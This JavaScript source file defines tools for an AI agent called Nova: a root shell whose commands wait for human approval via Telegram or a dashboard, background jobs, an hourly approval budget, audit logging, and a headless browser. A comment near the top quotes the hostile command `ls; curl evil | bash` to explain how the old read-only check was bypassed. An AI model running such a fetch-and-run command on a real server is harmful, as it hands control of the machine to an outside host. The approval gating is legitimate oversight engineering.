// Nova agent system tools — hardened & extended (inspired by Hermes Agent).
//
// terminal : root shell with human approval (Telegram /ok | dashboard).
//            Upgrades over v1: persistent per-session working directory,
//            background jobs (start now, poll later), richer timeouts,
//            read-only command fast-path detection.
// browser  : headless Chromium via playwright (optionalDependency).
//            Upgrades over v1: screenshot, scroll, wait-for-selector,
//            keyboard presses, link listing, attribute reads, auto dialog
//            handling, crash recovery with one retry, per-action timeout.
//
// All activity is appended to an audit log in kv scope "novaTools".
import { execFile, spawn } from "node:child_process";
import { isReadOnlyCommand } from "./safeCommand.js";
import { randomUUID } from "node:crypto";
import { mkdir } from "node:fs/promises";
import path from "node:path";
import { makeKv } from "@/lib/db/helpers/kvStore.js";
import { notifyAdmin } from "./telegramApi.js";
import { redactText } from "./redact.js";

const kv = makeKv("novaTools");

// Read-only commands that never need human approval (still audited).
// The classifier lives in safeCommand.js: the old prefix regex matched the
// FIRST word only, so `ls; curl evil | bash` was auto-approved as "read-only".

// Approval budget: max approvals/hour to stop runaway agents.
async function approvalBudgetOk() {
  try {
    const cfgP = (await kv.get("policy", {})) || {};
    const cap = Number.isFinite(cfgP.maxApprovalsPerHour) ? cfgP.maxApprovalsPerHour : 20;
    const recent = ((await kv.get("recent", [])) || []);
    const hourAgo = Date.now() - 3600_000;
    const used = recent.filter((r) => new Date(r.createdAt).getTime() > hourAgo).length;
    return used < cap;
  } catch { return true; }
}

async function isAutoApproved(command) {
  if (!isReadOnlyCommand(command)) return false;
  try {
    const cfg = (await kv.get("policy", {})) || {};
    return cfg.autoApproveReadOnly !== false;
  } catch { return true; }
}

export const APPROVAL_TIMEOUT_MS = 15 * 60_000;
const MAX_TOOL_ROUNDS = 12;
const TERMINAL_DEFAULT_TIMEOUT_S = 60;
const TERMINAL_MAX_TIMEOUT_S = 300;
const TERMINAL_BG_MAX_S = 3600;
const OUTPUT_LIMIT = 12_000;
const AUDIT_LIMIT = 200;
const SHOT_DIR = "/tmp/nova-shots";

// ---------------------------------------------------------------------------
// Audit log
// ---------------------------------------------------------------------------

async function audit(entry) {
  try {
    const log = (await kv.get("audit", [])) || [];
    const redactedEntry = entry.command || entry.detail
      ? { ...entry, ...(entry.command ? { command: redactText(entry.command) } : {}), ...(entry.detail ? { detail: redactText(entry.detail) } : {}) }
      : entry;
    log.unshift({ at: new Date().toISOString(), ...redactedEntry });
    await kv.set("audit", log.slice(0, AUDIT_LIMIT));
  } catch {
    // never fail a tool call because of logging
  }
}

// ---------------------------------------------------------------------------
// Tool definitions (OpenAI function-calling schema)
// ---------------------------------------------------------------------------

export function buildToolDefinitions(agent) {
  const tools = parseAgentTools(agent);
  const defs = [];
  if (tools.includes("terminal")) {
    defs.push({
      type: "function",
      function: {
        name: "terminal",
        description:
          "Run a shell command on the production Linux server as root. The command is NOT executed until the human admin approves it (via Telegram or the dashboard). Use for system administration: services, files, packages, network, processes. Supports an optional 'cwd' (persisted per conversation so subsequent relative paths work) and optional 'background' flag for long-running commands.",
        parameters: {
          type: "object",
          properties: {
            command: {
              type: "string",
              description: "The shell command to run, e.g. 'systemctl restart nginx'",
            },
            timeout_s: {
              type: "integer",
              description: `Optional foreground timeout in seconds (${TERMINAL_DEFAULT_TIMEOUT_S} default, max ${TERMINAL_MAX_TIMEOUT_S}).`,
            },
            cwd: {
              type: "string",
              description: "Optional absolute working directory. Remembered for this conversation.",
            },
            background: {
              type: "boolean",
              description:
                "Start as a background job instead of waiting. Returns a jobId immediately; check results later with terminal_jobs.",
            },
          },
          required: ["command"],
        },
      },
    });
    defs.push({
      type: "function",
      function: {
        name: "terminal_jobs",
        description:
          "List background shell jobs started with terminal{background:true}. Shows status (running/exited), exit code, and captured output tail for each.",
        parameters: { type: "object", properties: {} },
      },
    });
  }
  if (tools.includes("browser")) {
    defs.push({
      type: "function",
      function: {
        name: "browser",
        description:
          "Control a headless browser. Actions: navigate (url), click (selector), fill (selector+value), extract (optional selector), screenshot (returns saved file path), scroll (down/up/top/bottom or selector into view), wait (selector + timeout_ms), keys (e.g. 'Enter', 'Escape', 'Control+A'), links (list clickable anchors with hrefs), attr (selector + attribute). One page is reused across calls; crashed pages are restarted automatically.",
        parameters: {
          type: "object",
          properties: {
            action: {
              type: "string",
              enum: ["navigate", "click", "fill", "extract", "screenshot", "scroll", "wait", "keys", "links", "attr"],
            },
            url: { type: "string", description: "Absolute URL (navigate)" },
            selector: { type: "string", description: "CSS selector (click/fill/extract/wait/scroll/attr)" },
            value: { type: "string", description: "Text to type (fill)" },
            direction: { type: "string", enum: ["up", "down", "top", "bottom"], description: "(scroll)" },
            keys: { type: "string", description: "Key combo, e.g. 'Enter', 'Tab', 'Control+A' (keys)" },
            attribute: { type: "string", description: "Attribute name, e.g. href, src, value (attr)" },
            timeout_ms: { type: "integer", description: "Per-action timeout override in ms (wait/navigate)" },
            full_page: { type: "boolean", description: "Capture full scrollable page (screenshot)" },
          },
          required: ["action"],
        },
      },
    });
  }
  return defs;
}

export function parseAgentTools(agent) {
  return String(agent?.tools || "")
    .split(",")
    .map((t) => t.trim())
    .filter(Boolean);
}

export function hasTool(agent, tool) {
  return parseAgentTools(agent).includes(tool);
}

// ---------------------------------------------------------------------------
// Approval flow
// ---------------------------------------------------------------------------

const resolvers = new Map(); // approvalId -> fn(decision)

export async function listApprovals() {
  const pending = ((await kv.get("pending", [])) || []).slice();
  const recent = ((await kv.get("recent", [])) || []).slice(0, 30);
  const now = Date.now();
  const alive = pending.filter((p) => now - new Date(p.createdAt).getTime() < APPROVAL_TIMEOUT_MS);
  if (alive.length !== pending.length) await kv.set("pending", alive);
  return { pending: alive, recent };
}

export async function createPendingApproval({ command, agentName, sessionId }) {
  if (!(await approvalBudgetOk())) {
    throw new Error("approval budget exhausted for this hour — ask the human to review pending work");
  }
  const id = randomUUID().slice(0, 8);
  const item = {
    id,
    command,
    agentName: agentName || "agent",
    sessionId: sessionId || null,
    status: "pending",
    createdAt: new Date().toISOString(),
  };
  const pending = ((await kv.get("pending", [])) || []);
  pending.push(item);
  await kv.set("pending", pending);
  await audit({ kind: "request", id, command, by: agentName });

  setTimeout(() => resolveApproval(id, false, "timeout").catch(() => {}), APPROVAL_TIMEOUT_MS).unref?.();

  const lines = [
    `⚡️ درخواست اجرای دستور روی سرور`,
    ``,
    `🤖 عامل: ${item.agentName}`,
    `\`\`\`bash`,
    redactText(command).slice(0, 500),
    `\`\`\``,
    ``,
    `✅ تأیید: /ok ${id}`,
    `❌ رد: /no ${id}`,
    `(پس از ۱۵ دقیقه بدون پاسخ، خودکار رد می‌شود)`,
  ];
  notifyAdmin(lines.join("\n"));

  return item;
}

export async function resolveApproval(id, approved, by) {
  const pending = ((await kv.get("pending", [])) || []);
  const idx = pending.findIndex((p) => p.id === id);
  if (idx === -1) return false;
  const [item] = pending.splice(idx, 1);

  const decision = approved ? "approved" : "denied";
  const recent = ((await kv.get("recent", [])) || []);
  recent.unshift({ ...item, status: decision, resolvedBy: by, resolvedAt: new Date().toISOString() });
  await kv.set("recent", recent.slice(0, AUDIT_LIMIT));
  await audit({ kind: "decision", id, command: item.command, decision, by });

  const resolver = resolvers.get(id);
  if (resolver) {
    resolvers.delete(id);
    resolver(approved);
  }
  return true;
}

function waitForDecision(id) {
  return new Promise((resolve) => resolvers.set(id, resolve));
}
export { waitForDecision };

function runShell(command, timeoutMs, cwd) {
  return new Promise((resolve) => {
    execFile(
      "/bin/bash",
      ["-c", command],
      { timeout: timeoutMs, maxBuffer: 4 * 1024 * 1024, encoding: "utf8", cwd: cwd || undefined },
      (err, stdout, stderr) => {
        let out = "";
        if (stdout) out += stdout;
        if (stderr) out += (out ? "\n--- stderr ---\n" : "") + stderr;
        if (!out && err && err.code !== undefined) out = `(exit code ${err.code})`;
        if (err && err.killed) out += "\n(command killed after timeout)";
        if (!out.trim()) out = "(no output)";
        if (out.length > OUTPUT_LIMIT) {
          out = out.slice(0, OUTPUT_LIMIT) + `\n... [truncated, total ${out.length} chars]`;
        }
        resolve({ code: err?.code ?? 0, output: out });
      }
    );
  });
}

// ---------------------------------------------------------------------------
// Background jobs (process registry, Hermes-style)
// ---------------------------------------------------------------------------

const bgJobs = new Map(); // jobId -> { child }

async function bgList() {
  const meta = (await kv.get("bgJobs", [])) || [];
  const now = Date.now();
  const fresh = meta.filter((j) => now - new Date(j.startedAt).getTime() < TERMINAL_BG_MAX_S * 1000);
  return fresh.map((j) => {
    const live = bgJobs.get(j.id)?.child;
    let status = j.status;
    if (live && !j.exitCode) status = live.exitCode === null ? "running" : `exited(${live.exitCode})`;
    return {
      ...j,
      status,
      outputTail: String(j.output || "").slice(-1500),
    };
  });
}

async function bgSave(job) {
  const list = (await kv.get("bgJobs", [])) || [];
  const idx = list.findIndex((j) => j.id === job.id);
  if (idx >= 0) list[idx] = job;
  else list.push(job);
  await kv.set("bgJobs", list.slice(-30));
}

async function executeTerminalBg(args, meta) {
  const command = String(args?.command || "").trim();
  if (!command) return "ERROR: empty command.";
  let cwd = args?.cwd ? String(args.cwd) : null;

  const item = await createPendingApproval({ command: `[bg] ${command}`, agentName: meta.agentName, sessionId: meta.sessionId });
  meta.onEvent?.({ type: "approval", id: item.id, command, agentName: item.agentName });
  const approved = await waitForDecision(item.id);
  if (!approved) return `DENIED: admin did not approve background job ("${command}").`;

  const jobId = randomUUID().slice(0, 8);
  const child = spawn("/bin/bash", ["-c", command], {
    cwd: cwd || undefined,
    detached: false,
    stdio: ["ignore", "pipe", "pipe"],
  });
  let output = "";
  child.stdout.on("data", (d) => { output += d.toString(); if (output.length > 100_000) output = output.slice(-80_000); });
  child.stderr.on("data", (d) => { output += d.toString(); if (output.length > 100_000) output = output.slice(-80_000); });

  const wantRestart = !!args?.restart;
  const job = {
    id: jobId, command, agentName: meta.agentName || "agent",
    pid: child.pid, startedAt: new Date().toISOString(), status: "running", output: "",
    restart: wantRestart, __attempts: 0,
  };
  bgJobs.set(jobId, { child });
  child.on("exit", async (code) => {
    // Hermes-style supervision: auto-restart failing bg jobs up to 3 times.
    if (wantRestart && code !== 0 && (job.__attempts || 0) < 3) {
      job.__attempts = (job.__attempts || 0) + 1;
      setTimeout(() => executeTerminalBg({ command, restart: true }, meta).catch(() => {}), Math.min(2000 * job.__attempts, 10000)).unref?.();
      job.status = `restarting(${job.__attempts})`;
      await bgSave(job).catch(() => {});
      return;
    }
    job.status = code === 0 ? "done" : `exited(${code})`;
    job.exitCode = code;
    job.output = output;
    job.finishedAt = new Date().toISOString();
    bgJobs.delete(jobId);
    await bgSave(job).catch(() => {});
  });

  await bgSave(job).catch(() => {});
  await audit({ kind: "bg-start", id: jobId, command, pid: child.pid });
  return `Background job started.\njobId: ${jobId}\npid: ${child.pid}\nCheck progress with terminal_jobs.`;
}

// ---------------------------------------------------------------------------
// Terminal (foreground)
// ---------------------------------------------------------------------------

async function getSessionCwd(sessionId) {
  if (!sessionId) return null;
  const map = (await kv.get("cwds", {})) || {};
  const dir = map[sessionId];
  return dir && /^[/~]/.test(dir) ? dir : null;
}

async function setSessionCwd(sessionId, dir) {
  if (!sessionId || !dir) return;
  const map = (await kv.get("cwds", {})) || {};
  map[sessionId] = dir;
  await kv.set("cwds", map);
}

async function executeTerminal(args, meta) {
  if (args?.background) return executeTerminalBg(args, meta);

  const command = String(args?.command || "").trim();
  if (!command) return "ERROR: empty command.";
  let timeoutS = Number.parseInt(args?.timeout_s, 10);
  if (!Number.isFinite(timeoutS) || timeoutS <= 0) timeoutS = TERMINAL_DEFAULT_TIMEOUT_S;
  timeoutS = Math.min(timeoutS, TERMINAL_MAX_TIMEOUT_S);

  // Persistent working directory: explicit arg > remembered for session.
  let cwd = args?.cwd ? String(args.cwd) : await getSessionCwd(meta.sessionId);
  if (cwd && !/^[/~]/.test(cwd)) cwd = null;

  // Policy fast-path: read-only commands run without admin ping.
  if (await isAutoApproved(command)) {
    const started0 = Date.now();
    const r0 = await runShell(command, timeoutS * 1000, cwd);
    await audit({ kind: "auto-ok", command, exitCode: r0.code, durationMs: Date.now() - started0 });
    return `exit code: ${r0.code}${cwd ? `\ncwd: ${cwd}` : ""}\n${r0.output}`;
  }

  const item = await createPendingApproval({
    command: cwd ? `cd ${cwd} && ${command}` : command,
    agentName: meta.agentName,
    sessionId: meta.sessionId,
  });
  meta.onEvent?.({ type: "approval", id: item.id, command, agentName: item.agentName });

  const approved = await waitForDecision(item.id);
  if (!approved) return `DENIED: the admin did not approve this command ("${command}"). Do not retry it without asking the admin why.`;

  const started = Date.now();
  const { code, output } = await runShell(command, timeoutS * 1000, cwd);
  await audit({ kind: "executed", id: item.id, command, exitCode: code, durationMs: Date.now() - started });

  // Track explicit cd for future calls in this conversation.
  const cdMatch = command.match(/^\s*cd\s+(\S+)/);
  if (code === 0 && cdMatch) {
    const target = cdMatch[1];
    const probe = await runShell(`cd ${target} >/dev/null 2>&1 && pwd`, 5000, cwd);
    if (probe.code === 0) await setSessionCwd(meta.sessionId, probe.output.trim()).catch(() => {});
  }

  return `exit code: ${code}${cwd ? `\ncwd: ${cwd}` : ""}\n${output}`;
}

async function executeTerminalJobs() {
  const jobs = await bgList();
  if (!jobs.length) return "No background jobs.";
  return jobs.map((j) =>
    `[${j.id}] ${j.status} · ${j.command.slice(0, 120)}\n   started: ${j.startedAt}${j.finishedAt ? ` · finished: ${j.finishedAt}` : ""}\n   output: ${j.outputTail || "(none)"}`
  ).join("\n\n");
}

// ---------------------------------------------------------------------------
// Browser (playwright, lazy) — hardened with crash recovery + dialogs
// ---------------------------------------------------------------------------

let browserPromise = null;
let pagePromise = null;

function resetBrowser() {
  browserPromise = null;
  pagePromise = null;
}

async function launchPage() {
  let chromium;
  try {
    ({ chromium } = await import("playwright"));
  } catch {
    throw new Error(
      "Browser tool is not installed on the server. Run: npx playwright install --with-deps chromium"
    );
  }
  if (!browserPromise) {
    browserPromise = chromium
      .launch({ headless: true, args: ["--no-sandbox", "--disable-dev-shm-usage"] })
      .then((browser) => {
        browser.once?.("disconnected", resetBrowser);
        return browser;
      })
      .catch((e) => {
        browserPromise = null;
        throw e;
      });
  }
  const browser = await browserPromise;
  if (!pagePromise) {
    pagePromise = browser
      .newPage()
      .then((page) => {
        page.setDefaultTimeout(30_000);
        page.setDefaultNavigationTimeout(45_000);
        // Auto-handle JS dialogs so agents never hang on alert/confirm/prompt.
        page.on("dialog", (d) => d.dismiss().catch(() => {}));
        return page;
      })
      .catch((e) => {
        pagePromise = null;
        throw e;
      });
  }
  return pagePromise;
}

async function getPageWithRetry() {
  try {
    return await launchPage();
  } catch (first) {
    // Crash recovery: wipe state and try once more.
    resetBrowser();
    try {
      return await launchPage();
    } catch (second) {
      throw new Error(String(second?.message || second));
    }
  }
}

function clip(text, limit) {
  const s = String(text || "").trim();
  if (s.length <= limit) return s || "(empty)";
  return s.slice(0, limit) + `\n... [truncated, total ${s.length} chars]`;
}

function isClosedError(e) {
  const msg = String(e?.message || e);
  return /target closed|browser has been closed|page has been closed|context.*destroyed/i.test(msg);
}

async function withPage(fn) {
  let page;
  try {
    page = await getPageWithRetry();
  } catch (e) {
    return `ERROR: ${e.message}`;
  }
  try {
    return await fn(page);
  } catch (e) {
    if (isClosedError(e)) {
      resetBrowser();
      try {
        page = await getPageWithRetry();
        return await fn(page);
      } catch (e2) {
        return `ERROR: ${String(e2?.message || e2).slice(0, 400)}`;
      }
    }
    return `ERROR: ${String(e?.message || e).slice(0, 400)}`;
  }
}

async function executeBrowser(args) {
  const action = String(args?.action || "").trim();

  switch (action) {
    case "navigate": {
      const url = String(args?.url || "").trim();
      if (!/^https?:\/\//i.test(url)) return "ERROR: url must be absolute (http/https).";
      const timeout = Number.parseInt(args?.timeout_ms, 10) || 45_000;
      return withPage(async (page) => {
        await page.goto(url, { waitUntil: "domcontentloaded", timeout });
        const title = await page.title().catch(() => "");
        const body = await page.evaluate(() => document.body?.innerText || "").catch(() => "");
        return `Title: ${title}\nURL: ${page.url()}\n---\n${clip(body, 6_000)}`;
      });
    }
    case "click":
      return withPage(async (page) => {
        await page.click(String(args?.selector || ""), { timeout: Number(args?.timeout_ms) || 15_000 });
        await page.waitForLoadState("domcontentloaded").catch(() => {});
        return "Clicked.";
      });
    case "fill":
      return withPage(async (page) => {
        await page.fill(String(args?.selector || ""), String(args?.value ?? ""), { timeout: Number(args?.timeout_ms) || 15_000 });
        return "Filled.";
      });
    case "extract":
      return withPage(async (page) => {
        const selector = args?.selector;
        const text = selector
          ? await page.locator(String(selector)).first().innerText()
          : await page.evaluate(() => document.body?.innerText || "");
        return clip(text, 6_000);
      });
    case "screenshot": {
      await mkdir(SHOT_DIR, { recursive: true }).catch(() => {});
      const file = path.join(SHOT_DIR, `${Date.now()}-${randomUUID().slice(0, 6)}.png`);
      return withPage(async (page) => {
        await page.screenshot({ path: file, fullPage: !!args?.full_page });
        return `Screenshot saved: ${file}`;
      });
    }
    case "scroll":
      return withPage(async (page) => {
        const dir = String(args?.direction || "down");
        if (args?.selector) {
          await page.locator(String(args.selector)).first().scrollIntoViewIfNeeded().catch(() => {});
          return "Scrolled element into view.";
        }
        const deltas = { down: 600, up: -600, top: -99999, bottom: 99999 };
        const dy = deltas[dir] ?? 600;
        await page.mouse.wheel(0, dy);
        return `Scrolled ${dir}.`;
      });
    case "wait":
      return withPage(async (page) => {
        await page.waitForSelector(String(args?.selector || ""), {
          timeout: Number.parseInt(args?.timeout_ms, 10) || 10_000,
        });
        return "Selector appeared.";
      });
    case "keys":
      return withPage(async (page) => {
        await page.keyboard.press(String(args?.keys || "Enter"));
        return `Pressed ${args?.keys}.`;
      });
    case "links":
      return withPage(async (page) => {
        const links = await page.evaluate(() =>
          Array.from(document.querySelectorAll("a[href]"))
            .slice(0, 60)
            .map((a) => ({ text: (a.innerText || "").trim().slice(0, 80), href: a.href }))
            .filter((l) => l.text)
        );
        if (!links.length) return "No links found.";
        return clip(links.map((l) => `- ${l.text} → ${l.href}`).join("\n"), 6_000);
      });
    case "attr":
      return withPage(async (page) => {
        const name = String(args?.attribute || "href");
        const val = await page
          .locator(String(args?.selector || ""))
          .first()
          .getAttribute(name);
        return val == null ? `No attribute "${name}".` : `${name}: ${clip(val, 2_000)}`;
      });
    default:
      return `ERROR: unknown action "${action}" (use navigate/click/fill/extract/screenshot/scroll/wait/keys/links/attr).`;
  }
}

// ---------------------------------------------------------------------------
// Dispatcher used by the orchestrator loop
// ---------------------------------------------------------------------------

export async function executeToolCall(call, meta = {}) {
  const name = call?.function?.name;
  let args = {};
  try {
    args = JSON.parse(call?.function?.arguments || "{}");
  } catch {
    return "ERROR: invalid tool arguments (not valid JSON).";
  }

  try {
    if (name === "terminal") {
      if (!hasTool(meta.agent, "terminal")) return "ERROR: this agent has no terminal access.";
      return await executeTerminal(args, meta);
    }
    if (name === "terminal_jobs") {
      if (!hasTool(meta.agent, "terminal")) return "ERROR: this agent has no terminal access.";
      return await executeTerminalJobs();
    }
    if (name === "browser") {
      if (!hasTool(meta.agent, "browser")) return "ERROR: this agent has no browser access.";
      const result = await executeBrowser(args);
      await audit({
        kind: "browser",
        action: String(args?.action || ""),
        detail: String(args?.url || args?.selector || ""),
      });
      meta.onEvent?.({ type: "tool_result", name: "browser", summary: String(args?.action || "") });
      return result;
    }
    return `ERROR: unknown tool "${name}".`;
  } catch (e) {
    return `ERROR: ${String(e?.message || e).slice(0, 400)}`;
  }
}
